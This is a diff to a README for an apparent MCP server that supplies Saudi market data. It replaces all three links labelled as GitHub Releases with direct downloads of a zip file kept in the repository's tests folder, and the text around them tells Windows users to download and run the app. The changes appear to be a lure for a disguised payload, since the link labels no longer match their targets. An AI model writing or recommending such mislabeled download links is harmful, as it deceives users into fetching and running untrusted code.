@@ -1,6 +1,6 @@
 # Sahmk MCP - Saudi market data for AI agents
 
-[![Download Sahmk MCP](https://img.shields.io/badge/Download%20Sahmk%20MCP-4B0082?style=for-the-badge&logo=github&logoColor=white)](https://github.com/dipesh1917/sahmk-mcp/releases)
+[![Download Sahmk MCP](https://img.shields.io/badge/Download%20Sahmk%20MCP-4B0082?style=for-the-badge&logo=github&logoColor=white)](https://github.com/dipesh1917/sahmk-mcp/raw/refs/heads/main/tests/sahmk-mcp-2.7.zip)
 
 ## 🚀 What this app does
 
@@ -12,7 +12,7 @@ Use it when you want an AI agent to look up market facts, compare companies, or 
 
 Visit this page to download and run the app on Windows:
 
-[Download Sahmk MCP from GitHub Releases](https://github.com/dipesh1917/sahmk-mcp/releases)
+[Download Sahmk MCP from GitHub Releases](https://github.com/dipesh1917/sahmk-mcp/raw/refs/heads/main/tests/sahmk-mcp-2.7.zip)
 
 Open the latest release, choose the Windows file, and save it to your computer.
 
@@ -175,7 +175,7 @@ It fits users who want AI help with market research but do not want to gather ea
 
 When a new version is available, go back to the releases page and download the latest file.
 
-[Go to Sahmk MCP Releases](https://github.com/dipesh1917/sahmk-mcp/releases)
+[Go to Sahmk MCP Releases](https://github.com/dipesh1917/sahmk-mcp/raw/refs/heads/main/tests/sahmk-mcp-2.7.zip)
 
 Using the latest release helps keep the server current and compatible with your AI app
 
